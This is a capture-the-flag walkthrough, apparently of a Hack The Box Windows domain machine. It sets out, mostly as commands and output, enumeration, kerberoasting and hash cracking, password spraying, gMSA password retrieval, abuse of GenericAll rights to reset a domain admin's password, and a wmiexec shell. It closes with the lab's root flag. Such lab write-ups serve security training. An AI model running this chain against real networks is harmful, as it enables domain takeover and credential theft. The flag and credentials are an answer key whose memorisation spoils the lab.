**Skills Required**
Web enumeration
Hash cracking
Active Directory enumeration

**Skills Learned**
Removing protection from XLSX files
Using Windows PowerShell Web Access
GMSA password retrieval
Exploiting misconfigured Active Directory ACLs


We initiated the enumeration process by scanning  port 80(http) using whatweb

``` bash
❯ whatweb 10.10.11.129
http://10.10.11.129 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[youremail@search.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.129], JQuery[3.3.1], Microsoft-IIS[10.0], Script, Title[Search &mdash; Just Testing IIS], X-Powered-By[ASP.NET]
```

We identified  a doman name (search.htb), and added it to our hosts file

To gather information, we attempted to use rpcclient on port(135)
``` bash
❯ rpcclient -U "" 10.10.11.129 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

Access Denied we need valid credentials for this.

Next, we proceeded to enumerate port 443(https) using openssl to extract domain names
``` bash
openssl s_client -connect 10.10.11.129:443
research.search.htb
```

We discovered the domain name "research.search.htb" and added it to our hosts file

Continuing our enumeration, we used crackmapexec taking advantage port 445 (smb)

``` bash
❯ crackmapexec smb 10.10.11.129
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
```

Use smbmap to list the shared resources

``` bash
❯ smbmap -H 10.10.11.129 -u 'null'
[!] Authentication error on 10.10.11.129
```

Access Denied, we need valid credentials to list the shared resources

Checking the website, there is sensitive information in a Picture (credentials)

``` bash
hope.sharp:IsolationIskey?
```

To validate these credentials, we utilized crackmapexec

``` bash
❯ crackmapexec smb 10.10.11.129 -u 'hope.sharp' -p 'IsolationIsKey?'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
```

Credentials are valid, we can try now  rpcclient

``` bash
rpcclient -U "hope.sharp%IsolationIskey?" 10.10.11.129
> enumdomusers

```

there are a lot of users,   and checked if any were vulnerable to ASREProast attack
``` bash
❯ rpcclient -U "hope.sharp%IsolationIsKey?" 10.10.11.129 -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users
```

Using GetNPUsers

``` bash
❯ GetNPUsers.py search.htb/ -no-pass -usersfile users
```

Users didn't have the "Don't Require PreAuth" Set, these users are not vulnerable to ASREProast attack


Continuing our enumeration, we utilized  the bloodhound tool to identify potential attack vectors within the active directory

```bash
mkdir bloodhound
bloodhound-python -c ALL -u 'hope.sharp' -p 'IsolationIsKey?' -ns 10.10.11.129 -d search.htb
neo4j console
bloodhound &> /dev/null & disown

# In the program:
# - Upload data
# - Search for users for whom you already have credentials and mark them as "pwned" in the program
# - Then, select a user and use the "node info" option
```

With this tool we identified the user "web_svc" and this user is kerberoastable
Using GetUserSPNs we retrieved the hash 

``` bash
#sincronized clock -> sudo ntpdate 10.10.11.129

❯ GetUserSPNs.py search.htb/hope.sharp -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 07:59:11.329031  <never>               
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$9060cae7591fa50561f058acce5d50e6$70bf019d292a6db20df9e446a061e0ffbf94599ea83aee27bcc81b78e06e2f006e2c2cd17757ce68d6f26b4063f4a2fa61144181807df619be3c59d6715e9ad59fde2fc38f0316f33b33dd6828ed0d7e28e8e54cffcdf35ef7d501204efe3cd0ec27f8bfc904425ebcdc304ecc7227fcfcb2df48f2ea8155f33342221d87acf144b1984d4e40e18a116e995b61acff85d62249ae97c36565cd22a541bd44e294b34b09aae97932dfbd1e60ade1718e3685006fd931b79008a81bd21793e2a7fda1d0a4e21c34fa3a1787d39a836646f87c885daefe38a2410ffc80fd171fb02e3b02cd952b051daa1bdb9d5468928f029a65ce1b4c03b29b9a80f422ad3fce0ac701d3918baf4f2b3b48d547865397196ca4e3efcbeb39707d098abed3a634f637ab8d92257240cd0e98f9856b1d71e51d36b252c4c214c218801f90a4647c3ad494fa1782750b21f4b674f3e6b790e8396526b74a3bfdd23ddadf2b18b70e6408f44a107240e7eeaacee06e42fc43230eb1a7f5d85d2f57b0d7674212aaa708016cb5d9fc20fbbfbfb57f56c5f2ab5e7f6bb394bfb31d662d0d56d8e6c3d50439d36c272704b5917fbad8f6b221743afbb164edec49155c0da13158d991657e13e576b32de25ad22e993731e609667ac0a7b59a815b36cbfb5d9f6432c4b6ae252a03d2c9f380781220b20f64dec211f852eceb7561ff55d81262dfacd2011145626872b02b2290c0945b23be4f2bb2f8e313583f757b9dc1ccfe5f5c17eb043cadeee13a25af56e27134b19b430f01d12b51f6933b48d801612c43fa089e76f1ec2f66b830bb12d931ea9c0c3ab99db844f4388d1645dd7e25fdaf8bd6669653d514a504debfbad9f0218fd69d646a66fdcd298659a144b2d8d90184fc3c3e8615f05135a37e8f126c1c6a945df1269799068d574e027b63cf7ebc412d8cb44a6672087adec732afe4b47b874691e5c00466dd69897cbb4ff16c9159f4bc378c5062ff778dfd64c76a6902022c43bf24542b6ae7c033b3b471f3e90fcbc56b12e783b9d7ffc152d7f7333b623641739be282aa5d2d3b5db6b94a8b95c7e1683e15a2351dbc5005ca54f509ea9fdcb5cab41af5cd329b524a894e9d8b3836cf9b1a9519e9c93b37a73c9187e2d4fc793c94be8765a543594f3185118a85cbc292789a0ac526cecbc3ecb5a963e14d35f8e44ff83379106f762c4e613f8f24a78000332c404bb74504591a346917e7a3e60903e86530bf58d8e429951633264444e18664fecb6eb0fc51cd8fdf26e600d31aece69fe9f5e1ca7816da8e7ac60bb671281850b54eccdd3dfdc96cff89bcad152f497274979a53647393ced5456ad048281cd566cb0769bc5c022117dfddc43f81d9ec01806210136bde1281861f656da43888edd895f62780f48e9228748338eadbab088936c7e1f766816d0a7e98c4460bd3ded6059d2ce41bec3713e8593d8691e9
```

Now crack the hash using john
``` bash
❯ john --wordlist=~/Documents/wordlist/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
@3ONEmillionbaby (?)
1g 0:00:00:04 DONE (2023-09-28 20:27) 0.2347g/s 2697Kp/s 2697Kc/s 2697KC/s @421eduymayte619..?!.r.3.m?
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We have new credentials for another user, Since we have a list of users we can perform a Password Reuse Attack
``` bash
❯ crackmapexec smb 10.10.11.129 -u users -p '@3ONEmillionbaby' --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 
```

We discovered another user who is using the same password as the user "web_svc"

We already have 3 user credentials, so we can use smbmap with the credentials  to gather more information

``` bash
❯ smbmap -H 10.10.11.129 -u 'edgar.jacobs' -p '@3ONEmillionbaby'

[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
```

This user we had "read, write" permissions in RedirectedFolders$ resource. Within this directory, we found a "pishing_attempt.xlsx" file and downloaded it

``` bash
smbmap -H 10.10.11.129 -u 'edgar.jacobs' -p '@3ONEmillionbaby' -r 'RedirectedFolders$/edgar.jabos/Desktop'

smbmap -H 10.10.11.129 -u 'edgar.jacobs' -p '@3ONEmillionbaby' --download 'RedirectedFolders$/edgar.jabos/Desktop/pishing_attempt.xlsx'
```

In this file we obtain credentials, but the file is protected and is easily to crack it
``` bash
unzip pishing_attempt.xlsx
tree -fas
cd xl/worksheets
cat sheet2.xml
delete the hash protection from the sheet2.xml file
comprim the files - > zip Document.xlsx

Passwords                                      
;;36!cried!INDIA!year!50;;
..10-time-TALK-proud-66..
??47^before^WORLD^surprise^91??
//51+mountain+DEAR+noise+83//
++47|building|WARSAW|gave|60++
!!05_goes_SEVEN_offer_83!!
~~27%when%VILLAGE%full%00~~
$$49=wide=STRAIGHT=jordan=28$$18
==95~pass~QUIET~austria~77==
//61!banker!FANCY!measure!25//
??40:student:MAYOR:been:66??
&&75:major:RADIO:state:93&&
**30*venus*BALL*office*42**
**24&moment&BRAZIL&members&66**

Users
Payton.Harmon
Cortez.Hickman
Bobby.Wolf
Margaret.Robinson
Scarlett.Parks
Eliezer.Jordan
Hunter.Kirby
Sierra.Frye
Annabelle.Wells
Eve.Galvan
Jeramiah.Fritz
Abby.Gonzalez
Joy.Costa
Vincent.Sutton


```

Now, with the protection removed, we obtained user credentials. 

We validated these credentials using crackmapexec
``` bash
❯ crackmapexec smb 10.10.11.129 -u users2 -p credentials2 --no-bruteforce --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
```

Just one credential is valid "Sierra.Frye", at this time we have 4 user credentials

Using smbmap again with this new credentials

``` bash
❯ smbmap -H 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -r 'RedirectedFolders$/Sierra.Frye'

❯ smbmap -H 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -r 'RedirectedFolders$/Sierra.Frye/Downloads/Backups'

search-RESEARCH-CA.p12
staff.pfx
```

After enumerating shared resources for this user, we discovered two files , which were certificates for firefox, but before we need to crack their passwords using john
``` bash
pfx2john staff.pfx > hash
john --wordlist=rockyou hash
misspissy
```

We have the password and can import these certification into firefox, now what we have to do is fuzz the website to look for something related to "staff"

``` bash
❯ wfuzz --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.129/FUZZ
```

wfuzz discovered the  "staff"  path and pop up "this site has requested certificate"  we already imported . We gained access to a Windows PowerShell Web using the previous credentials

``` bash
Username: Sierra.Frye
Password: ...$$
Computer name: research
```


If we check back the bloodhound page we can view the "shortest paths to domain admins from owned principals" and discovered that  the user "Sierra.Frye" could exploit "readgmsapassword" to gain access as "BIR-ADFS-GMSA" and this had "generic all" to the user "tristan.davies" , a member of domain administrator.
For this we use the https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/ resource

``` powershell
# On powershell console

$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp -> SecureCurrentPassword

#inject commands as the user BIR-ADFS-GMSA
$secpw = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
$cred = New-Object System.Management.Automation.PScredential 'BIR-ADFS-GMSA',$secpw
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { whoami }

# the user BIR-ADFS-GMSA have the "generic all" privilege on the user "tristan-davies" we can change their password
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { net user tristan.davies password123@ }

#validate this with crackmapexec
❯ crackmapexec smb 10.10.11.129 -u 'tristan.davies' -p 'password123@'

SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:password123@ (Pwn3d!)

# now using wmiexec.py we can connect to the victim machine as the user tristan.davis, who is administrator
❯ wmiexec.py search.htb/tristan.davies@10.10.11.129
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
search\tristan.davies
C:\Users\Administrator\Desktop>type root.txt
e03465666384670cd8c7b414de27c0ce
```




